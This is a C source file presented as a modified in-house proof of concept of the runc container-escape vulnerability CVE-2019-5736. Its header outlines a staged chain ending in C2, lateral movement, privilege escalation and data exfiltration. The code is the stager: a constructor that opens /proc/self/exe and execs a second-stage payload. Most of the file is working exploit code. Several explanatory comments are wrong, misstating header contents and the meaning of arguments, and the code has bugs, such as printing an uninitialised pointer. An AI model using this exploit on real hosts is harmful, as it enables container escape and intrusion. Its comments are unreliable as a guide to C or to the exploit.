/* 
 * ==========================================
 * File: payloadstage.c
 * Author: Matthew Stacks & Brian Nelson
 * Organization: Rendition Infosec
 * Source Author: q3k
 * Description: Modified PoC of CVE-2019-5736 for internal use by Rendition Infosec
 * 
 * Execution of this exploit occurs in three parts:
 * -- 1. Payload Stager (payloadstage.c)
 *     Responsible for: 
 *        Downloading (Staging) the Payload Setter
 *        Injecting the Payload Setter into Memory
 *        Passing Execution to the Payload Setter
 *        
 * -- 2. Payload Setter (payloadset.c)
 *    Responsible for:
 *         Establishing a Foothold
 *         Lateral Movement
 *         Enabling C2
 * 
 * -- 3. C2 (c2.c)
 *    Responsible for:
 *        Payload Execution
 *        Local Privilege Escalation
 *        Channel Establishment
 *        Data Exfiltration
 * 
 * ==========================================
 */

/* 
 * ==========================================
 * Header Files
 * 
 * stdio.h
 *     Defines standard I/O process streams:
 *         stdin
 *         stdout
 *         stderr
 *         null
 *     Defines these functions:
 *         printf()
 *         snprintf()
 *         get()
 *         set()
 *
 * sys/types.h
 *     Defines standard system data types:
 *         void
 *         char
 *         char *ptr
 *         int
 *     Defines __attribute__ ((constructor))
 *
 * sys/stat.h
 *     Defines the format of data returned by system calls 
 *         stat()
 *         lstat()
 *         fstat()
 *
 * fcntl.h
 *     Defines functions that act on File Descriptors:
 *         open()
 *         socket()  
 *         pipe()
 *         read()
 *         write()
 *     
 * unistd.h
 *     Provides access to the POSIX API
 *     Allows C compatibility between 
 *      POSIX, UNIX, macOS, and Linux
 *
 * ==========================================
 */

#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>

/* 
 * ================================
 * Function Attributes
 *
 * Purpose: __attribute__ allows attributes 
 * to be attached to functions that meet
 * criteria defined in the attribute list
 * 
 * Attribute-Lists
 * 
 * Purpose: The ((constructor)) attribute-list
 * passes on attributes to the foo function.
 * Specifically, functions with __attribute__ ((constructor)) 
 * are called BEFORE int main() executes.
 *
 * void foo(void)
 * 
 * Purpose: A function that explicity takes no arguments.
 * The purpose of this function is to pass on the constructor 
 * function attribute to /proc/self/exe
 * without taking it as an argument
 * ================================
 */

__attribute__ ((constructor)) void foo(void)
{
    int fd = open("/proc/self/exe", O_RDONLY);
    if (fd == -1 ) {
        printf("ERR: can't open /proc/self/exe\n");
        return 0;
    }
    
/*
 * ================================
 * Function and Variable Assignments
 
 * Purpose: Prepare argument vectors 
 * and variables within the environment
 * to be passed on to payloadset.c
 *
 * ================================
 */
    
    printf("File Descriptor: %d\n", fd);              /* Prints the FD of /proc/self/exe returned in line __                  */
    
    char *argv2[3];                                   /* char * is a fixed pointer
                                                       * Whatever value argv2[3] holds, char *argv2[3] always points to it    */
    
    printf("argv2[3]: %s\n", argv2[3]);               /* Tracks the value of argv2[3]                                         */
    
    argv2[0] = strdup("/payloadset");                 /* The first argument (fd) is duplicated to /payloadset                 */
    
    printf("argv2[0]: %s\n", argv2[0]);               /* Tracks the value of argv2[0]                                         */
    
    char buf[128];                                    /* Sets the buffer to 128 bytes.
                                                       * Allows stager.c to be compiled 
                                                       * without knowing what will be passed to it at runtime                 */
    
    snprintf(buf, 128, "/proc/self/fd/%d", fd);       /* snprintf() is in the same function family as printf()
                                                       * printf() produces formatted output to stdout 
                                                       * snprintf() produces output as a string 
                                                       * Output of snprintf() is, at max, n bytes, 
                                                       * where n is the max buffer
                                                       * This function prints these strings, with a max of 128 bytes:
                                                       *     The current size of the values held in buffer memory (max 128)
                                                       *     128
                                                       *     /proc/self/fd/3                                                  */
    
    argv2[1] = buf;                                   /* Sets argv2[1] to the current value of contents held in buffer memory */
    
    printf("argv2[1]: %s\n", argv2[1]);               /* Tracks the value of argv2[1]                                         */
    
    argv2[2] = 0;                                     /* Sets argv2[2] to 0                                                   */
    
    printf("argv2[2]: %s\n", argv2[2]);               /* Tracks the value of argv2[2]                                         */
    
    execve("/payloadset", argv2, NULL);               /* Replaces the current process image with a new process image 
                                                       * "/payloadset" points to the new process image path
                                                       * argv2 points to /payloadset/payloadset.c
                                                       * On complete, the new process terminates into NULL                    */
}
